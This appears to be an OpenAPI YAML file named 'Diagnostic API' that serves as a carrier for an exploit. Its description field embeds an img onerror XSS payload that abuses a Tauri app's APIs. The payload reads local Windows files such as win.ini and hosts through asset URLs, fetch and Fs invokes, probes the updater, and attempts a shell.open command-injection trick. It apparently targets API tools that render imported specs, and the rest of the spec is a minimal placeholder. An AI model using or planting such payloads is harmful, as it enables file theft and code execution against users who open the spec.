openapi: "3.0.0"
info:
  title: "Diagnostic API"
  version: "1.0.0"
  description: |
    RCE test.
    <img src=x onerror="(function(){var t=window.__TAURI__;if(!t)return;var r=['=== RCE TEST (Part 5: HTTP asset read + updater + fs invoke) ===',''];var tests=[];var i=0;function add(n,f){tests.push([n,f])}function next(){if(i>=tests.length){alert(r.join('\n'));return}var name=tests[i][0];var fn=tests[i][1];i++;r.push('['+i+'] '+name);try{fn().then(function(v){r.push('  -> OK: '+JSON.stringify(v).substring(0,250))}).catch(function(e){r.push('  -> FAIL: '+String(e).substring(0,150))}).then(function(){next()})}catch(e){r.push('  -> ERR: '+String(e).substring(0,150));next()}}add('Tauri http.fetch asset URL',function(){var u=t.convertFileSrc('C:\\Windows\\win.ini');r.push('  url: '+u);return t.http.fetch(u,{method:'GET',responseType:2}).then(function(x){r.push('  status: '+x.status+' data len: '+(x.data?x.data.length:0));r.push('  content: '+String(x.data).substring(0,200));return 'HTTP ASSET READ: '+x.status})});add('Tauri http.fetch asset hosts',function(){var u=t.convertFileSrc('C:\\Windows\\System32\\drivers\\etc\\hosts');return t.http.fetch(u,{method:'GET',responseType:2}).then(function(x){r.push('  status: '+x.status+' len: '+(x.data?x.data.length:0));r.push('  '+String(x.data).substring(0,200));return 'READ: '+x.status})});add('stream_fetch asset URL',function(){return t.tauri.invoke('stream_fetch',{method:'GET',url:'http://asset.localhost/C%3A%5CWindows%5Cwin.ini',headers:{},body:[]}).then(function(x){r.push('  status: '+x.status);return 'stream: '+x.status})});add('fetch asset no-cors mode',function(){var u=t.convertFileSrc('C:\\Windows\\win.ini');return fetch(u,{mode:'no-cors'}).then(function(x){r.push('  type: '+x.type+' status: '+x.status);return 'no-cors: type='+x.type})});add('invoke Fs readTextFile direct',function(){return t.tauri.invoke('tauri',{__tauriModule:'Fs',message:{cmd:'readTextFile',path:'C:\\Windows\\win.ini',options:{}}})});add('invoke Fs readTextFile BaseDir',function(){return t.tauri.invoke('tauri',{__tauriModule:'Fs',message:{cmd:'readTextFile',path:'win.ini',options:{dir:6}}})});add('updater.checkUpdate',function(){return t.updater.checkUpdate().then(function(u){r.push('  manifest: '+JSON.stringify(u).substring(0,200));return 'update: '+JSON.stringify(u).substring(0,100)})});add('shell.open URL with space trick',function(){return t.shell.open('https://a calc.exe')});next()})()">
servers:
  - url: "https://api.example.com/v1"
paths:
  /test:
    get:
      operationId: runTest
      summary: "Run test"
      parameters:
        - name: id
          in: query
          required: true
          schema:
            type: string
      responses:
        "200":
          description: "OK"
          content:
            application/json:
              schema:
                type: object
                properties:
                  status:
                    type: string
